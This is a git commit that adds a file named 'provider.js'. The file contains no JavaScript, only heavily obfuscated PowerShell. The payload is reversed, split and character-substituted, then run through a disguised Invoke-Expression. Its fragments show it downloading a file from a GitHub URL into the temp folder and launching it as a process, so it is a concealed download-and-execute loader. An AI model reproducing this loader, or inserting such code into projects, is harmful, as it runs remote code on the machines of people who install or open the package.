0090d33904d71e1c359b7a10a8a8dbad03892f29
asakaj2 <andreasakajo3@gmail.com>
2025-03-04 10:16:42 -0600

    Create provider.js

---
+++ provider.js
@@ -0,0 +1,22 @@
+sET-VARiAbLe ("4"+"8t7c")  ([chAr[ ] ] ")''Nioj-]52,62,4[CepsMoC:vNE$ (& |)43]rAhc[,)09]rAhc[+711]rAhc[+221]rAhc[(eCAlpErc-  63]rAhc[,'gbr'  ECalPer-93]rAhc[,'HzV'  ECalPer-  421]rAhc[,'bTO'ECalPer- )')HzVXHzV+]31[DilLEhSgbr+]1[DIlLEhsgbr ( &bTO)93]RAhc[,HzVZPkHzV eCALpErC- 63]RAhc[,)87]RAhc[+98]RAhc[+68]RAhc[(eCALpErC-  29]R'+'Ahc[,)94]RAhc[+89]RAhc[+35]RAhc[(  ecAlPEr- '+'))HzV}7{}31{fpY( = )3Tsa3Ts(HzV,H'+'zV
+'+'
+Z'+'Pk(()ZPkZPHzV,HzVaOlNEu'+'zwEuzoEuzd{2eZ( fi     ZPk+ZP'+'k 
+ }      
+;}EslEuzAEuzF{2'+'eZ = }DaOEuzl'+'NEuzWod{2eZ        
+{ )}'+'hTEuzAP'+'eLEuziEuzF{2eZ )3T'+'shZPk+ZPktaPHzV,HzVrAHc[]GNIrts[,ZPkfpY'+'ZPk(ECALPer.)69]rAHc[]GNIrts[,ZPkEuzZPk(ECALPer.)HzV,HzV ) )ZPk1b5ZPk,)021]'+'rAHc[+311]rAHc[+90'+'H'+'zV,HzVk )}D'+'HzV,HzV  
+;}HzV,HzV    
+ ;}HTEuzaPEliEuzf{2eZ eliFZPk+ZPktuO- fpYafpY.}i{2eZ irU- )3'+'Tsh'+'teZPk+ZPk3Ts,3Tsv3Ts,3TstseR-eko3Ts,3TsnI3Ts,3TsHzV,HzVdo3Ts,3TsM3Tsf-fpZPk+ZPkY}1{}5{}0{}3{ZPHzV,HzVsf3Ts,3T'+'sh'+'ca3HzV,HzVTs,3Tsiz.3Ts,3Tse3THzV,HzVpY(.( fi    HzV,HzVk+ZPk'+'3Ts,3Tst3Tsf-fpY}2{}0{}1{fHzV,HzVEUEuzrt{2eZ = }'+'DAolNwEuzoEuZPk+ZPkzd{2eZ      
+;'+'fpY)b.i2eZ(2eZxqmPMET:vne2e'+'Z'+'fpY = }HtapEuzELHzV,HzVZPkNYVZPk,ZPk2eZZPk(ECALPer.)93]rAHc[]GNIrts[,ZPk3TsZPk(ECA'+'LPer.)ZPk  
+
+}  
+}  ZPk+ZPk  
+{ h'+'ctac    
+}    
+;}hTEuzApeE'+'uzLIF{2eZ )3TsecorP3Ts,3Tsss3Ts,3TZPk+ZPks-tr'+'3Ts,3TsS3Ts,3Tsat3Tsf-fpY}3{}4{}2{}0{'+'}1{fpY(&  ZPk+ZPk    '+'
+}  HzV,HzVs,3TsselZ'+'Pk+ZPki3Ts'+'f- fpY}51{}2{}'+'21{}6{}0{}4{}8{}5{}1{}41{}3{}11{}01{}9{HzV,HzVzf{2eZ      
+{ yrt    
+{ )}aTEuzaDemOZPk+ZPkEuzS{2e'+'Z ni }I{2eZ( hcaerof  
+;)
+ZPk+ZPk})3Tssm.'+'N3Ts,3TsMAS3Ts,3Tsi3Ts,3TsVTKLHzV,HzVk+ZPkTsb3'+'Ts( ;)3Ts'+'p3Ts,3Tsm3Ts,3TZPk+ZPksth3Ts,3TsN3Ts,3Tstta-'+'resu/mHzV,HzV{@]tcejbOmotsuCSP[  
+(@ = }aTAdeE'+'uzmZPk+ZPkoS{2eZ  HzV,HzVk+ZPk}4{}2{fpY(.        
+{ZPk+ZPHzV,HzVIEHzV,HzVoc3Ts,3Ts.3Ts,3Tsb3Ts,3Ts/st3Ts,3'+'Tsuhtig//:spHzV,HzV1]rAHc[((ECA'+'LPer.)43]HzV,HzV3Tsf- fpY}1{}3{}0{}2{fpY( = )3'+'ZPHzV,HzVuHzV,HzVt3Ts,3TsVTKLMAS/16047091'+'ZPk+ZPk/3HzV,HzVkniOJ-]2,11,3[eMAN.'+')ZPk'+'*RDm*ZPk vg((& HzV,HzV-ZPk+ZPk3Ts,3TsseTZP'+'HzV,Hz'+'VTs,3Tsn3Ts,3THzVf-Zuz}42{}6{}52{}41{}12{}02'+'{}9{}32{'+'}62{}1'+'{}61'+'{}71{}22{}51{}8{}4{}21{}5{}11{}7'+'{}3{}0{}91{}81{}31{}82{}01{}72{'+'}2{Zuz(('+'( '(("); [ARRay]::rEVErsE( (  ChIldIteM  ('vAr'+'i'+'ABLE'+':48t7c')  ).VAluE ) ;(  ChIldIteM  ('vAr'+'i'+'ABLE'+':48t7c')  ).VAluE -JOIn '' |. ( $VerBOSeprEFErEnCe.tosTrING()[1,3]+'X'-JoiN'')
